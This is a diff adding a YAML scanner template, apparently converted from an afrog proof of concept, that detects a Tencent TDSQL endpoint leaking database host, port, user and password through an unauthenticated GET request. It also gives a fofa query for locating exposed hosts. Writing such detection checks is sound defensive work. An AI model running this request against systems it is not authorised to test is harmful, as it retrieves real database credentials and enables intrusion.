@@ -1,0 +1,29 @@
+# 来源: afrog（转换自 afrog/xray 表达式 POC）
+http:
+  - matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"ip":"'
+          - '"port":"'
+          - '"user":"'
+          - '"pwd":"'
+        condition: and
+    method: GET
+    path:
+      - '{{BaseURL}}/tdsqlpcloud/index.php/api/install/get_db_info'
+id: tencent-tdsql-leak
+info:
+  author: zan8in
+  description: 'fofa: app="TDSQL"'
+  metadata:
+    argus-execution-class: detection
+    argus-import-license: MIT License
+    argus-import-source: afrog
+    argus-risk-level: high
+  name: 腾讯 TDSQL 数据库信息泄露
+  severity: high
+  tags: tencent,tdsql,leak,disclosure,argus-import
